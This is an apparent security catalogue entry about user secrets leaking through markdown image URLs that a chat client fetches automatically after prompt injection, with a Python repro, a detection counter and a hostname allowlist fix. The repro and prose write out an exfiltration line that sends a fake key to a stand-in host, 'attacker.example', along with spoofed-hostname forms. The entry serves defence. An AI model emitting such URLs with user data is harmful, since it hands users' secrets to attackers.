---
id: SEC-04
title: Private data leaves through a rendered image URL or link
category: security
severity: high
frequency: occasional
symptom: An attacker-controlled host receives a GET with the user's secret in the query string seconds after an answer renders, with no click
stage: model-call
tags: exfiltration, markdown-rendering, prompt-injection, egress
---

## What you see
The transcript looks normal apart from a broken-image icon or an invisible 1x1 pixel. The attacker's access log shows `GET /p.png?d=sk-live-9f2a71c4` from the user's own IP seconds after the answer rendered, and the user never clicked anything. In the repro, rendering one assistant message makes the client issue a request to `attacker.example` with the secret in the URL.

## Why it happens
Markdown image syntax is a fetch instruction executed by the renderer, not by the model, and chat clients load every image URL in an assistant message as it appears, using the user's browser and network. The model can write any string it holds into a URL, so anything in context (a key, an earlier message, a retrieved document) is the payload and rendering is the transmission. No tool call runs, so tool gating such as the one in SEC-01 never fires. The assumption that breaks is that model output is inert text until a human acts on it. How the injection arrived does not matter: a poisoned document, a hostile web page or a model quirk produce the same string. The repro uses a fixture string as the model output and records the URLs a client would request; no model and no network are involved.

## Minimal reproduction
```python
import re
from urllib.parse import urlparse

SECRET = "sk-live-9f2a71c4"
OUTPUT = (f"Done. ![ok](https://app.example/img/ok.png) "
          f"![s](https://attacker.example/p.png?d={SECRET})")

def render(markdown, allow_hosts=None):
    fetched = []
    for url in re.findall(r"!\[[^\]]*\]\(([^)]+)\)", markdown):
        if allow_hosts is None or urlparse(url).hostname in allow_hosts:
            fetched.append(url)
    return fetched

leaked = [u for u in render(OUTPUT) if SECRET in u]
assert len(leaked) == 1
print("FAILURE: client would fetch", leaked[0])
fetched = render(OUTPUT, allow_hosts={"app.example"})
assert fetched == ["https://app.example/img/ok.png"]
print("FIXED: client fetches only", fetched)
```
The fuller version adds reference-style images, spoofed hostnames and a long-query rule on the allowed host; it is in repro/SEC-04.py.

## Detection
Before delivery, extract every URL the client would fetch from each assistant message (inline and reference-style images, HTML `img` tags, link-preview candidates) and emit a counter `output_url_host_not_allowlisted` per message; any non-zero value on an agent that never needs external images is a page. Add a canary check: put a random canary string in the run's context, replay red-team prompts, and assert the canary appears in no URL in any output. A log query for URLs whose query string is longer than about 12 characters on any host also finds the pattern after the fact.

## The fix
Enforce the rule where the fetch happens, on the parsed result rather than on the source text: an image is loaded only if the scheme is https, the hostname exactly equals an allowlisted host, and the query string is short. Everything else renders as inert text.
```python
parts = urlparse(url)
ok = parts.scheme == "https" and parts.hostname in ALLOWED and len(parts.query) <= 12
```
Hostname equality matters: the repro shows `startswith("https://app.example")` accepting both `app.example.attacker.example` and `app.example@attacker.example`. A regex that scrubs inline images from the markdown source misses the reference-style form that renders identically, which is why the check belongs at the fetch, not the source.

## How it still bites
Proxying external images through your own server "to protect user IPs" moves the exfiltration to your infrastructure: the proxy dutifully fetches `attacker.example/p.png?d=SECRET` on the attacker's behalf, from inside your network, so it needs the same allowlist or it adds an SSRF hole. Links are the same channel with one extra click that no allowlist can forbid, because users want some external links; show the destination host, strip the query string, and expect link unfurlers in chat apps to fetch the URL before anyone clicks.
